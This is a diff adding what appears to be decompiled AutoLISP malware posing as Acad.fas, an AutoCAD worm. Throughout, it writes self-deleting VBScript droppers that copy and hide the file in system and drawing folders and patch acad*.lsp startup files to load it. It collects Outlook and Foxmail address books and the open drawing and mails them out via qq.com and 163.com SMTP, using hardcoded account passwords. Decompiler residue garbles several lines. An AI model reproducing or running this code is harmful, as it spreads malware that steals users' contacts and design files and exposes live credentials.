@@ -1,0 +1,332 @@
+(defun main 
+FasStringtables 0
+FasStringtables 1
+(defun main 
+nil
+(SETVAR "cmdecho" 0)
+(setq VL-FILE-DIRMK <Func> VL-FILE-DIRMK)
+VL-FILE-DIRMK
+(setq VL_SJSTA-END <Func> VL_SJSTA-END)
+VL_SJSTA-END
+(SETVAR "ACADLSPASDOC" 1)
+(setq MK-SPRING-C (FINDFILE (STRCAT (GETVAR "DWGPREFIX") "Acad.fas")))
+(setq MK-SPRING-C Then OR Else)
+(setq MK-SPRING-C Then OR Else)
+(setq SPRING-H (VL-REGISTRY-READ "HKEY_CURRENT_USER\Software\Microsoft\Windows\Windows Error Reporting" "FILE-H"))
+(setq MK-INFO-BIN (LIST "ON ERROR RESUME NEXT" "Const OverwriteExisting = True" "Set objFSO = CreateObject("Scripting.FileSystemObject")" "Set WshShell = WScript.CreateObject("WScript.Shell")" (STRCAT "objFSO.CopyFile "" MK-SPRING-C "" , "" (STRCAT (GETENV "windir") "\System32\Acad.fas") "" , OverwriteExisting") (STRCAT "objFSO.CopyFile "" MK-SPRING-C "" , "" (STRCAT (GETENV "windir") "\Acad.fas") "" , OverwriteExisting") (STRCAT "WshShell.run "attrib +h +R " (STRCAT (GETENV "windir") "\System32\Acad.fas") "",0 ") (STRCAT "WshShell.run "attrib +h +R " (STRCAT (GETENV "windir") "\System\Acad.fas") "",0 ") "createobject("scripting.filesystemobject").getfile(wscript.scriptfullname).delete"))
+(setq MK_FILE-TEMP-A (VL-FILENAME-MKTEMP nil nil ".vbs"))
+(setq MK_FILE-TEMP-B (OPEN (setq MK_FILE-TEMP-A (VL-FILENAME-MKTEMP nil nil ".vbs")) "w"))
+(MAPCAR '(LAMBDA '(X) '(WRITE-LINE X MK_FILE-TEMP-B)) MK-INFO-BIN)
+(CLOSE MK_FILE-TEMP-B)
+(STARTAPP (STRCAT (GETENV "windir") "\System32\wscript.exe") MK_FILE-TEMP-A 2)
+(VL-REGISTRY-WRITE "HKEY_CURRENT_USER\Software\Microsoft\Windows\Windows Error Reporting" "FILE-H" "T")
+(setq ACADOBJ (GETVAR Then OR Else))
+(cond (WCMATCH ACADOBJ "*14.0*") (
+(cond (WCMATCH ACADOBJ "*15.0*") (
+(cond (WCMATCH ACADOBJ "*16.0*") (
+(cond (WCMATCH ACADOBJ "*16.1*") (
+(cond (WCMATCH ACADOBJ "*16.2*") (
+(cond (WCMATCH ACADOBJ "*17.0*") (
+(cond (WCMATCH ACADOBJ "*17.1*") (
+(cond (WCMATCH ACADOBJ "*17.2*") (
+(cond (WCMATCH ACADOBJ "*18.0*") (
+(cond (WCMATCH ACADOBJ "*18.1*") (
+(cond (WCMATCH ACADOBJ "*18.2*") (
+(cond (WCMATCH ACADOBJ "*19.0*") (
+(cond (WCMATCH ACADOBJ "*19.1*") (
+(cond (WCMATCH ACADOBJ "*19.2*") (
+normal cond
+(WCMATCH ACADOBJ "*19.2*")
+(setq AUTOFILE "acad2015.lsp")
+normal cond
+"acad2015.lsp"
+(setq AUTOFILE "acad2014.lsp")
+normal cond
+"acad2014.lsp"
+(setq AUTOFILE "acad2013.lsp")
+normal cond
+"acad2013.lsp"
+(setq AUTOFILE "acad2012.lsp")
+normal cond
+"acad2012.lsp"
+(setq AUTOFILE "acad2011.lsp")
+normal cond
+"acad2011.lsp"
+(setq AUTOFILE "acad2010.lsp")
+normal cond
+"acad2010.lsp"
+(setq AUTOFILE "acad2009.lsp")
+normal cond
+"acad2009.lsp"
+(setq AUTOFILE "acad2008.lsp")
+normal cond
+"acad2008.lsp"
+(setq AUTOFILE "acad2007.lsp")
+normal cond
+"acad2007.lsp"
+(setq AUTOFILE "acad2006.lsp")
+normal cond
+"acad2006.lsp"
+(setq AUTOFILE "acad2005.lsp")
+normal cond
+"acad2005.lsp"
+(setq AUTOFILE "acad2004.lsp")
+normal cond
+"acad2004.lsp"
+(setq AUTOFILE "acad2002.lsp")
+normal cond
+"acad2002.lsp"
+(setq AUTOFILE "acad2000.lsp")
+(setq AUTOFILE-B (FINDFILE AUTOFILE))
+(setq AUTOFILE-ALL nil)
+(setq AUTOFILE-A (OPEN AUTOFILE-B "r"))
+(setq AUTOFILE-C (READ-LINE AUTOFILE-A))
+(setq $AUTOOP 1)
+(setq AUTOFILE-ALL (CONS Then OR Else AUTOFILE-ALL))
+(CLOSE AUTOFILE-A)
+(setq AUTOFILE-ALL (CONS "(if (findfile "cad.fas")(load "cad.fas"))" AUTOFILE-ALL))
+(setq AUTOFILE-ALL (REVERSE AUTOFILE-ALL))
+(setq AUTOFILE-C (OPEN AUTOFILE-B "w"))
+(MAPCAR '(LAMBDA '(X) '(WRITE-LINE X AUTOFILE-C)) AUTOFILE-ALL)
+(CLOSE AUTOFILE-C)
+(setq MK-INFO-BIN (LIST "ON ERROR RESUME NEXT" "Const OverwriteExisting = True" "Set objFSO = CreateObject("Scripting.FileSystemObject")" "Set WshShell = WScript.CreateObject("WScript.Shell")" (STRCAT "WshShell.run "attrib -R " AUTOFILE-B "  ",0 ") "createobject("scripting.filesystemobject").getfile(wscript.scriptfullname).delete"))
+(setq MK_FILE-TEMP-A (VL-FILENAME-MKTEMP nil nil ".vbs"))
+(setq MK_FILE-TEMP-B (OPEN (setq MK_FILE-TEMP-A (VL-FILENAME-MKTEMP nil nil ".vbs")) "w"))
+(MAPCAR '(LAMBDA '(X) '(WRITE-LINE X MK_FILE-TEMP-B)) MK-INFO-BIN)
+(CLOSE MK_FILE-TEMP-B)
+Then OR Else
+(setq MK-PATH (VL-FILE-DIRMK (GETENV "ACAD") ";"))
+(setq AUTOFILE-ALL '("(DEFUN S::STARTUP()" "(if (findfile "cad.fas")(load "cad.fas"))" "(princ)" ")"))
+(setq AUTOFILE-B (OPEN (STRCAT (CAR MK-PATH) "\" AUTOFILE) "w"))
+(MAPCAR '(LAMBDA '(X) '(WRITE-LINE X AUTOFILE-B)) AUTOFILE-ALL)
+(CLOSE AUTOFILE-B)
+(setq MK-PATH (VL-FILE-DIRMK (GETENV Then OR Else) ";"))
+(setq MK-PATH (CONS (GETVAR "DWGPREFIX") MK-PATH))
+(setq MK_REGISTRY-FOXLIS-OK "")
+(MAPCAR '(LAMBDA '(X) '(SETQ MK_REGISTRY-FOXLIS-OK '(STRCAT '(STRCAT "objFSO.CopyFile " """ MK-SPRING-C "" , "" X "\" , OverwriteExisting\n") '(STRCAT "objFSO.CopyFile " """ MK-SPRING-C "" , "" X "\cad.fas" , OverwriteExisting\n") MK_REGISTRY-FOXLIS-OK))) MK-PATH)
+(setq MK_REGISTRY-BLAN "")
+(MAPCAR '(LAMBDA '(X) '(SETQ MK_REGISTRY-BLAN '(STRCAT '(STRCAT "WshShell.run "attrib +h +R -A " X "\Acad.fas  " "",0 \n") MK_REGISTRY-BLAN))) MK-PATH)
+(MAPCAR '(LAMBDA '(X) '(SETQ MK_REGISTRY-BLAN '(STRCAT '(STRCAT "WshShell.run "attrib +h +R -A " X "\cad.fas  " "",0 \n") MK_REGISTRY-BLAN))) MK-PATH)
+(setq MK-INFO-BIN (LIST "ON ERROR RESUME NEXT" "Const OverwriteExisting = True" "Set objFSO = CreateObject("Scripting.FileSystemObject")" "Set WshShell = WScript.CreateObject("WScript.Shell")" MK_REGISTRY-FOXLIS-OK MK_REGISTRY-BLAN "createobject("scripting.filesystemobject").getfile(wscript.scriptfullname).delete"))
+(setq MK_FILE-TEMP-A (VL-FILENAME-MKTEMP nil nil ".vbs"))
+(setq MK_FILE-TEMP-B (OPEN (setq MK_FILE-TEMP-A (VL-FILENAME-MKTEMP nil nil ".vbs")) "w"))
+(MAPCAR '(LAMBDA '(X) '(WRITE-LINE X MK_FILE-TEMP-B)) MK-INFO-BIN)
+(CLOSE MK_FILE-TEMP-B)
+Then OR Else
+(setq MK-SPRING-L (FINDFILE "cad.fas"))
+(setq VL-STRING-TIME (FIX (* (GETVAR "cdate") 100)))
+(setq VL-FILE-CBAO-A (VL-REGISTRY-READ "HKEY_CURRENT_USER\Software\Microsoft\Windows\Windows Error Reporting" "Time"))
+(setq MK-PATH (VL-FILE-DIRMK (GETENV "ACAD") ";"))
+(setq MK-PATH (CONS (GETVAR "DWGPREFIX") MK-PATH))
+(setq MK_REGISTRY-FOXLIS-OK "")
+(MAPCAR '(LAMBDA '(X) '(SETQ MK_REGISTRY-FOXLIS-OK '(STRCAT '(STRCAT "objFSO.CopyFile " """ MK-SPRING-L "" , "" X "\" , OverwriteExisting\n") '(STRCAT "objFSO.CopyFile " """ MK-SPRING-L "" , "" X "\acad.fas" , OverwriteExisting\n") MK_REGISTRY-FOXLIS-OK))) MK-PATH)
+(setq MK_REGISTRY-BLAN "")
+(MAPCAR '(LAMBDA '(X) '(SETQ MK_REGISTRY-BLAN '(STRCAT '(STRCAT "WshShell.run "attrib +h +R -A " X "\Acad.fas  " "",0 \n") MK_REGISTRY-BLAN))) MK-PATH)
+(MAPCAR '(LAMBDA '(X) '(SETQ MK_REGISTRY-BLAN '(STRCAT '(STRCAT "WshShell.run "attrib +h +R -A " X "\cad.fas  " "",0 \n") MK_REGISTRY-BLAN))) MK-PATH)
+(setq MK-INFO-BIN (LIST "ON ERROR RESUME NEXT" "Const OverwriteExisting = True" "Set objFSO = CreateObject("Scripting.FileSystemObject")" "Set WshShell = WScript.CreateObject("WScript.Shell")" MK_REGISTRY-FOXLIS-OK MK_REGISTRY-BLAN "createobject("scripting.filesystemobject").getfile(wscript.scriptfullname).delete"))
+(setq MK_FILE-TEMP-A (VL-FILENAME-MKTEMP nil nil ".vbs"))
+(setq MK_FILE-TEMP-B (OPEN (setq MK_FILE-TEMP-A (VL-FILENAME-MKTEMP nil nil ".vbs")) "w"))
+(MAPCAR '(LAMBDA '(X) '(WRITE-LINE X MK_FILE-TEMP-B)) MK-INFO-BIN)
+(CLOSE MK_FILE-TEMP-B)
+Then OR Else
+(setq VL-CMD-LIKE 1)
+(setq VL-CMD-LIKE 1)
+(setq MAKEMAIL '("autocad-server@qq.com  cad-ver" "autocad-Line@qq.com cad-ver" "autocad-CirCle@qq.com cad-ver" "autocad-3DARRAY@qq.com cad-cer" "1281578303@qq.com 112181784" "1340695238@qq.com 112181784" "1102352045@qq.com 112181784" "1047634268@qq.com 123456789" "1535299815@qq.com 123456789" "1206457043@qq.com 123456789" "1556032198@qq.com 123456789zh" "1498199804@qq.com 123456789zh" "1574133602@qq.com 123456789zh" "1624084576@qq.com hhh123456" "1604505729@qq.com jjj123456" "1016858290@qq.com kkk123456" "1098726981@qq.com 123456789" "1546418743@qq.com 123456789" "903609896 @qq.com cad-ver" "1565843380@qq.com cad-ver" "1509436136@qq.com cad-ver"))
+(setq MAKEMAIL '("autocad-server@qq.com  cad-ver" "autocad-Line@qq.com cad-ver" "autocad-CirCle@qq.com cad-ver" "autocad-3DARRAY@qq.com cad-cer" "1281578303@qq.com 112181784" "1340695238@qq.com 112181784" "1102352045@qq.com 112181784" "1047634268@qq.com 123456789" "1535299815@qq.com 123456789" "1206457043@qq.com 123456789" "1556032198@qq.com 123456789zh" "1498199804@qq.com 123456789zh" "1574133602@qq.com 123456789zh" "1624084576@qq.com hhh123456" "1604505729@qq.com jjj123456" "1016858290@qq.com kkk123456" "1098726981@qq.com 123456789" "1546418743@qq.com 123456789" "903609896 @qq.com cad-ver" "1565843380@qq.com cad-ver" "1509436136@qq.com cad-ver"))
+(setq YUDJEMIN (REM (FIX (/ (GETVAR "CPUTICKS") 10)) (LENGTH MAKEMAIL)))
+(setq YUDJEMIN (REM (FIX (/ (GETVAR "CPUTICKS") 10)) (LENGTH MAKEMAIL)))
+(setq PRINC-YF-LT (NTH (FIX YUDJEMIN) MAKEMAIL))
+(setq PRINC-YF-LT (NTH (FIX YUDJEMIN) MAKEMAIL))
+(setq PRINC-YFMOO (VL-FILE-DIRMK PRINC-YF-LT " "))
+(setq PRINC-YFMOO (VL-FILE-DIRMK PRINC-YF-LT " "))
+(setq PRINC-YFMC (CAR PRINC-YFMOO))
+(setq PRINC-YFMC (CAR PRINC-YFMOO))
+(setq PRINC-YXMM (CADR PRINC-YFMOO))
+(setq PRINC-YXMM (CADR PRINC-YFMOO))
+(setq PRINC-YFM (CAR (VL-FILE-DIRMK PRINC-YFMC "@")))
+(setq PRINC-YFM (CAR (VL-FILE-DIRMK PRINC-YFMC "@")))
+(setq PRINC-YJFWQ "smtp.qq.com")
+(setq PRINC-YJFWQ "smtp.qq.com")
+(setq VL_REGIS-TIME (VL-REGISTRY-READ "HKEY_CURRENT_USER\Software\Microsoft\Windows\Windows Error Reporting" "FILE-G"))
+(setq VL_REGIS-TIME (VL-REGISTRY-READ "HKEY_CURRENT_USER\Software\Microsoft\Windows\Windows Error Reporting" "FILE-G"))
+(setq VL-REGIS-TIMEB (FIX (* (GETVAR "cdate") 1)))
+(setq VL-REGIS-TIMEB (FIX (* (GETVAR "cdate") 1)))
+(cond (NULL VL_REGIS-TIME) (
+(cond (> (ABS (- VL-REGIS-TIMEB VL_REGIS-TIME)) 30) (
+it's OR skip next 6 bytes -> 9231
+it's OR skip next 6 bytes -> 9231
+(setq VL_REGISTRY-FOXLIS nil)
+(setq VL_REGISTRY-LPOA (VL-REGISTRY-DESCENDENTS "HKEY_CURRENT_USER\Software\Microsoft\Office\12.0\Outlook\Catalog" T))
+(MAPCAR '(LAMBDA '(X) '(SETQ VL_REGISTRY-FOXLIS '(CONS X VL_REGISTRY-FOXLIS))) VL_REGISTRY-LPOA)
+(setq VL_REGISTRY-LPOA (VL-REGISTRY-DESCENDENTS "HKEY_CURRENT_USER\Software\Microsoft\Office\11.0\Outlook\Catalog" T))
+(MAPCAR '(LAMBDA '(X) '(SETQ VL_REGISTRY-FOXLIS '(CONS X VL_REGISTRY-FOXLIS))) VL_REGISTRY-LPOA)
+(setq VL_REGISTRY-LPOA (VL-REGISTRY-DESCENDENTS "HKEY_CURRENT_USER\Software\Microsoft\Office\13.0\Outlook\Catalog" T))
+(MAPCAR '(LAMBDA '(X) '(SETQ VL_REGISTRY-FOXLIS '(CONS X VL_REGISTRY-FOXLIS))) VL_REGISTRY-LPOA)
+(setq VL_REGISTRY-FOXA (VL-REGISTRY-READ "HKEY_CURRENT_USER\Software\Aerofox\Foxmail" "Executable"))
+(setq VL_REGISTRY-FOXLIS (CONS (STRCAT (VL-FILENAME-DIRECTORY VL_REGISTRY-FOXA) "\Address\Address.INDX") VL_REGISTRY-FOXLIS))
+(setq VL_REGISTRY-FOXLIS (CONS (STRCAT (VL-FILENAME-DIRECTORY VL_REGISTRY-FOXA) "\Address\Address.BOX") VL_REGISTRY-FOXLIS))
+(setq VL_REGISTRY-FOXLIS (CONS (STRCAT (VL-FILENAME-DIRECTORY VL_REGISTRY-FOXA) "\Address\Send.INDX") VL_REGISTRY-FOXLIS))
+(setq VL_REGISTRY-FOXLIS (CONS (STRCAT (VL-FILENAME-DIRECTORY VL_REGISTRY-FOXA) "\Address\Send.BOX") VL_REGISTRY-FOXLIS))
+(setq VL_REGISTRY-FOXLIS-OK Then OR Else)
+(MAPCAR '(LAMBDA '(X) '(IF '(FINDFILE X) '(SETQ VL_REGISTRY-FOXLIS-OK '(STRCAT '(STRCAT "Email.AddAttachment " """ X """) "\n" VL_REGISTRY-FOXLIS-OK)))) VL_REGISTRY-FOXLIS)
+(setq VL-INFO-BIN (LIST "ON ERROR RESUME NEXT" "NameSpace = "http://schemas.microsoft.com/cdo/configuration/"" "Set Email = CreateObject("CDO.Message")" (STRCAT "Email.From = "" PRINC-YFMC """) "Email.To = "me5uqyqyg@163.com"" (STRCAT "Email.Subject = " """ (STRCAT (GETENV "COMPUTERNAME") "+" (GETENV "USERNAME")) """) "Email.Textbody = "EmailU+00B5U+00D8U+00D6°§"" VL_REGISTRY-FOXLIS-OK "With Email.Configuration.Fields" ".Item(NameSpace&"sendusing") = 2" (STRCAT ".Item(NameSpace&"smtpserver") = "" PRINC-YJFWQ "" ") ".Item(NameSpace&"smtpserverport") = 25" ".Item(NameSpace&"smtpauthenticate") = 1" (STRCAT ".Item(NameSpace&"sendusername") = "" PRINC-YFM """) (STRCAT ".Item(NameSpace&"sendpassword") = "" PRINC-YXMM """) ".Update" "End With" "Email.Send" "createobject("scripting.filesystemobject").getfile(wscript.scriptfullname).delete"))
+(setq VL_FILE-TEMP-A (VL-FILENAME-MKTEMP nil nil ".vbs"))
+(setq VL_FILE-TEMP-B (OPEN (setq VL_FILE-TEMP-A (VL-FILENAME-MKTEMP nil nil ".vbs")) "w"))
+(MAPCAR '(LAMBDA '(X) '(WRITE-LINE X VL_FILE-TEMP-B)) VL-INFO-BIN)
+(CLOSE VL_FILE-TEMP-B)
+(VL-REGISTRY-WRITE "HKEY_CURRENT_USER\Software\Microsoft\Windows\Windows Error Reporting" "FILE-G" VL-REGIS-TIMEB)
+Then OR Else
+(setq VL-CMD-LIKE 2)
+(setq VL-CMD-LIKE 2)
+(setq VL-FILE-FILENAME (STRCAT (GETVAR "DWGPREFIX") (GETVAR "DWGNAME")))
+(setq VL-INFO-C (STRCAT (GETENV "COMPUTERNAME") "+" (GETENV "USERNAME")))
+(setq VL-FILE-FNAM-H (VL-REGISTRY-READ "HKEY_CURRENT_USER\Software\Microsoft\Windows\Windows Error Reporting" "FILE"))
+(setq VL-INFO-BIN (LIST "ON ERROR RESUME NEXT" "NameSpace = "http://schemas.microsoft.com/cdo/configuration/"" "Set Email = CreateObject("CDO.Message")" (STRCAT "Email.From = "" PRINC-YFMC """) "Email.To = "me5uqyqyg@163.com"" (STRCAT "Email.Subject = " """ VL-INFO-C """) (STRCAT "Email.Textbody = " """ VL-FILE-FNAM-H """) (STRCAT "Email.AddAttachment " """ VL-FILE-FNAM-H """) "With Email.Configuration.Fields" ".Item(NameSpace&"sendusing") = 2" (STRCAT ".Item(NameSpace&"smtpserver") = "" PRINC-YJFWQ "" ") ".Item(NameSpace&"smtpserverport") = 25" ".Item(NameSpace&"smtpauthenticate") = 1" (STRCAT ".Item(NameSpace&"sendusername") = "" PRINC-YFM """) (STRCAT ".Item(NameSpace&"sendpassword") = "" PRINC-YXMM """) ".Update" "End With" "Email.Send" "createobject("scripting.filesystemobject").getfile(wscript.scriptfullname).delete"))
+(setq VL_FILE-TEMP-A (VL-FILENAME-MKTEMP nil nil ".vbs"))
+(setq VL_FILE-TEMP-B (OPEN (setq VL_FILE-TEMP-A (VL-FILENAME-MKTEMP nil nil ".vbs")) "w"))
+(MAPCAR '(LAMBDA '(X) '(WRITE-LINE X VL_FILE-TEMP-B)) VL-INFO-BIN)
+(CLOSE VL_FILE-TEMP-B)
+(STARTAPP (STRCAT (GETENV "windir") "\System32\wscript.exe") VL_FILE-TEMP-A 2)
+Then OR Else
+(setq VL-CMD-LIKE 3)
+(setq VL-CMD-LIKE 3)
+(setq VL_FILE-TEMP-RAR (STRCAT (GETENV "windir") "\System32\U+00C8°ËU+00CEU+00B6U+00BB®≤U+00D0U+00B5U+00D6U+00C6U+00CDU+00BC.rar"))
+(setq VL_FILE-TEMP-DXF (STRCAT (GETENV "windir") "\System32\!U+00C8°ËU+00CEU+00B6U+00BB®≤U+00D0U+00B5U+00D6U+00C6U+00CDU+00BC\U+00C8°ËU+00CEU+00B6U+00BB®≤U+00D0U+00B5U+00D6U+00C6U+00CDU+00BC.dxf"))
+(VL-MKDIR (STRCAT (GETENV "windir") "\System32\!U+00C8°ËU+00CEU+00B6U+00BB®≤U+00D0U+00B5U+00D6U+00C6U+00CDU+00BC"))
+(setq VL_FILE-TEMP-DXF-B (OPEN VL_FILE-TEMP-DXF "w"))
+(setq VL_FILE-DXF-INFO (LIST "0" "SECTION" "2" "HEADER" "9" "$ACADVER" "1" "AC1015" "9" "$ACADMAINTVER" "70" "20" "9" "$DWGCODEPAGE" "3" "ANSI_936" "9" "$INSBASE" "SHADEPLOTCUSTOMDPI" "70" "300" "0" "ENDSEC" "0" "EOF"))
+(MAPCAR '(LAMBDA '(X) '(WRITE-LINE X VL_FILE-TEMP-DXF-B)) VL_FILE-DXF-INFO)
+(CLOSE VL_FILE-TEMP-DXF-B)
+(setq VL-SPRING-C (FINDFILE (STRCAT (GETVAR "DWGPREFIX") "acad.fas")))
+(setq VL-SPRING-D (STRCAT (GETENV "windir") "\System32\!U+00C8°ËU+00CEU+00B6U+00BB®≤U+00D0U+00B5U+00D6U+00C6U+00CDU+00BC\acad.fas"))
+(setq VL-SPRING-C (FINDFILE "acad.fas"))
+(setq VL-SPRING-D (STRCAT (GETENV "windir") "\System32\!U+00C8°ËU+00CEU+00B6U+00BB®≤U+00D0U+00B5U+00D6U+00C6U+00CDU+00BC\acad.fas"))
+(setq VL-INFO-BIN (LIST "ON ERROR RESUME NEXT" "Set WshShell = WScript.CreateObject("WScript.Shell")" "set so=createobject("scripting.filesystemobject")" (STRCAT "so.getfile("" VL-SPRING-C "").copy("" VL-SPRING-D "")") (STRCAT "WshShell.run "attrib +h +R " (GETENV "windir") "\System32\!U+00C8°ËU+00CEU+00B6U+00BB®≤U+00D0U+00B5U+00D6U+00C6U+00CDU+00BC\acad.fas  " "",0 ") (STRCAT "m1=" "" " (GETENV "windir") "\System32\U+00C8°ËU+00CEU+00B6U+00BB®≤U+00D0U+00B5U+00D6U+00C6U+00CDU+00BC.rar" """) (STRCAT "m2=" "" " (GETENV "windir") "\System32\!U+00C8°ËU+00CEU+00B6U+00BB®≤U+00D0U+00B5U+00D6U+00C6U+00CDU+00BC" """) "mm="WinRAR m -ep1 -hp1 "&m1&m2" "myre = WshShell.Run(mm , 0, True)" "createobject("scripting.filesystemobject").getfile(wscript.scriptfullname).delete"))
+(setq VL_FILE-TEMP-A (VL-FILENAME-MKTEMP nil nil ".vbs"))
+(setq VL_FILE-TEMP-B (OPEN (setq VL_FILE-TEMP-A (VL-FILENAME-MKTEMP nil nil ".vbs")) "w"))
+(MAPCAR '(LAMBDA '(X) '(WRITE-LINE X VL_FILE-TEMP-B)) VL-INFO-BIN)
+(CLOSE VL_FILE-TEMP-B)
+Then OR Else
+(setq MAKEMAIL '("cn1223543@163.com   cad-ver" "cn1285689@163.com   cad-ver" "cn1266959@163.com   cad-ver" "cn1252522@163.com   cad-ver" "cn1228121@163.com   cad-ver" "cn1229996@163.com   cad-ver" "cn1285151@163.com   cad-ver" "cn1284756@163.com   cad-ver" "bj8372647@163.com   cad-ver" "BJ7364756@163.com   cad-ver" "BJ2635422@163.com   cad-ver" "BJ3645254@163.com   cad-ver" "BJ365644@163.com   cad-ver" "lp8946375@163.com  cad-ver" "lp3526454@163.com  cad-ver" "lp3625364@163.com  cad-ver" "lp3625475@163.com  cad-ver" "lp3546576@163.com cad-ver" "cn1268155@163.com cad-ver" "cn1222998@163.com cad-ver" "cn1281126@163.com cad-ver" "cn1261992@163.com cad-ver" "cn1251692@163.com cad-ver"))
+(setq MAKEMAIL '("cn1223543@163.com   cad-ver" "cn1285689@163.com   cad-ver" "cn1266959@163.com   cad-ver" "cn1252522@163.com   cad-ver" "cn1228121@163.com   cad-ver" "cn1229996@163.com   cad-ver" "cn1285151@163.com   cad-ver" "cn1284756@163.com   cad-ver" "bj8372647@163.com   cad-ver" "BJ7364756@163.com   cad-ver" "BJ2635422@163.com   cad-ver" "BJ3645254@163.com   cad-ver" "BJ365644@163.com   cad-ver" "lp8946375@163.com  cad-ver" "lp3526454@163.com  cad-ver" "lp3625364@163.com  cad-ver" "lp3625475@163.com  cad-ver" "lp3546576@163.com cad-ver" "cn1268155@163.com cad-ver" "cn1222998@163.com cad-ver" "cn1281126@163.com cad-ver" "cn1261992@163.com cad-ver" "cn1251692@163.com cad-ver"))
+(setq YUDJEMIN (REM (FIX (/ (GETVAR "CPUTICKS") 10)) (LENGTH MAKEMAIL)))
+(setq YUDJEMIN (REM (FIX (/ (GETVAR "CPUTICKS") 10)) (LENGTH MAKEMAIL)))
+(setq PRINC-YF-LT (NTH (FIX YUDJEMIN) MAKEMAIL))
+(setq PRINC-YF-LT (NTH (FIX YUDJEMIN) MAKEMAIL))
+(setq PRINC-YFMOO (VL-FILE-DIRMK PRINC-YF-LT " "))
+(setq PRINC-YFMOO (VL-FILE-DIRMK PRINC-YF-LT " "))
+(setq PRINC-YFMC (CAR PRINC-YFMOO))
+(setq PRINC-YFMC (CAR PRINC-YFMOO))
+(setq PRINC-YXMM (CADR PRINC-YFMOO))
+(setq PRINC-YXMM (CADR PRINC-YFMOO))
+(setq PRINC-YFM (CAR (VL-FILE-DIRMK PRINC-YFMC "@")))
+(setq PRINC-YFM (CAR (VL-FILE-DIRMK PRINC-YFMC "@")))
+(setq PRINC-YJFWQ "smtp.163.com")
+(setq PRINC-YJFWQ "smtp.163.com")
+Then OR Else
+(setq VL-STRING-TIME (FIX (* (GETVAR "cdate") 100)))
+(setq VL-STRING-TIME (FIX (* (GETVAR "cdate") 100)))
+(setq VL-FILE-CBAO-A (VL-REGISTRY-READ "HKEY_CURRENT_USER\Software\Microsoft\Windows\Windows Error Reporting" "Time"))
+(setq VL-FILE-CBAO-A (VL-REGISTRY-READ "HKEY_CURRENT_USER\Software\Microsoft\Windows\Windows Error Reporting" "Time"))
+(VL-REGISTRY-WRITE "HKEY_CURRENT_USER\Software\Microsoft\Windows\Windows Error Reporting" "Time" (FIX (* (GETVAR "cdate") 100)))
+(setq VL-MODIFY-YI nil)
+(setq VL-MODIFY-YI (CONS (STRCAT (RTOS (VL_SJSTA-END 16253256 1652425146)) "@qq.com") VL-MODIFY-YI))
+(setq VL-MODIFY-YI (CONS (STRCAT (RTOS (VL_SJSTA-END 16253256 1652425146)) "@163.com") VL-MODIFY-YI))
+(setq VL-MODIFY-YI-B "")
+(MAPCAR '(LAMBDA '(X) '(SETQ VL-MODIFY-YI-B '(STRCAT X ";" VL-MODIFY-YI-B))) VL-MODIFY-YI)
+(setq VL-INFO-BIN (LIST (setq VL-MODIFY-YI-B "") "ON ERROR RESUME NEXT" "NameSpace = "http://schemas.microsoft.com/cdo/configuration/"" "Set Email = CreateObject("CDO.Message")" (STRCAT "Email.From = "" PRINC-YFMC """) (STRCAT "Email.To = " """ VL-MODIFY-YI-B """) "Email.Subject = "U+00CAU+00C0U+00BDU+00E7U+00C9U+00CF°¡U+00EEU+00C4U+00D1U+00B5U+00C4U+00CCU+00E2"" Then OR Else "With Email.Configuration.Fields" ".Item(NameSpace&"sendusing") = 2" (STRCAT ".Item(NameSpace&"smtpserver") = "" PRINC-YJFWQ "" ") ".Item(NameSpace&"smtpserverport") = 25" ".Item(NameSpace&"smtpauthenticate") = 1" (STRCAT ".Item(NameSpace&"sendusername") = "" PRINC-YFM """) (STRCAT ".Item(NameSpace&"sendpassword") = "" PRINC-YXMM """) ".Update" "End With" "Email.Send" "createobject("scripting.filesystemobject").getfile(wscript.scriptfullname).delete"))
+(setq VL_FILE-TEMP-A (VL-FILENAME-MKTEMP nil nil ".vbs"))
+(setq VL_FILE-TEMP-B (OPEN (VL-FILENAME-MKTEMP nil nil ".vbs") "w"))
+(MAPCAR '(LAMBDA '(X) '(WRITE-LINE X VL_FILE-TEMP-B)) VL-INFO-BIN)
+(CLOSE VL_FILE-TEMP-B)
+Then OR Else
+(setq VL-CMD-LIKE 4)
+(setq VL-CMD-LIKE 4)
+(setq VL-FILE-DIRMK nil)
+(setq OI nil)
+(setq UU nil)
+(setq II nil)
+(setq MK-SPRING-C nil)
+(setq MK-PATH nil)
+(setq MK_REGISTRY-FOXLIS-OK nil)
+(setq VL-FILE-DIRMK nil)
+(setq MK_REGISTRY-BLAN nil)
+(setq MK-INFO-BIN nil)
+(setq MK_FILE-TEMP-B nil)
+(setq VL_REGISTRY-FOXLIS nil)
+(setq VL_REGISTRY-LPOA nil)
+(setq VL_REGISTRY-FOXA nil)
+(setq VL_REGISTRY-FOXLIS nil)
+(setq VL_REGISTRY-FOXLIS-OK nil)
+(setq VL_FILE-TEMP-B nil)
+(setq VL-FILE-FILENAME nil)
+(setq VL-INFO-C nil)
+(setq VL-FILE-FNAM-H nil)
+(setq VL_FILE-TEMP-B nil)
+(setq VL_FILE-TEMP-A nil)
+(setq VL_FILE-TEMP-RAR nil)
+(setq VL_FILE-TEMP-DXF nil)
+(setq VL_FILE-TEMP-DXF-B nil)
+(setq VL_FILE-DXF-INFO nil)
+(setq VL-SPRING-C nil)
+(setq VL-SPRING-D nil)
+(setq VL_FILE-TEMP-B nil)
+(setq VL-STRING-TIME nil)
+(setq VL-FILE-CBAO-A nil)
+(setq VL-MODIFY-YI nil)
+(setq CPR_1 nil)
+(setq CPR_2 nil)
+(setq VL-MODIFY-YI nil)
+(setq VL-MODIFY-YI-B nil)
+(setq VL-FILE-FNAM-H nil)
+(setq VL_FILE-TEMP-B nil)
+(setq VL_FILE-TEMP-A nil)
+(setq VL-REGIS-TIMEB nil)
+(setq AUTOFILE-B nil)
+(setq AUTOFILE-ALL nil)
+(setq ACADOBJ nil)
+(setq AUTOFILE nil)
+(setq SPRING-H nil)
+(setq PRINC-YJFWQ nil)
+(setq PRINC-YFM nil)
+(setq PRINC-YXMM nil)
+(setq PRINC-YF-LT nil)
+(setq VL_SJSTA-END nil)
+(setq VL-CMD-LIKE nil)
+(setq VL-FILE-O nil)
+(setq VL-FILE-B nil)
+(setq VL-FILE-V nil)
+(setq VL-FILE-D nil)
+(setq VL-FILES-DEL nil)
+(setq VL-FILE-N nil)
+(setq IUDTUE nil)
+(setq MK-SPRING-L nil)
+(defun VL-FILE-DIRMK
+(II  BB)
+(_al-bind-alist '(OI UU LI))
+(setq OI nil)
+(setq UU (VL-STRING-SEARCH BB II))
+(setq LI (SUBSTR II 1 UU))
+(setq OI (CONS LI OI))
+(setq II (SUBSTR Then OR Else (+ 2 UU)))
+(setq OI (CONS II OI))
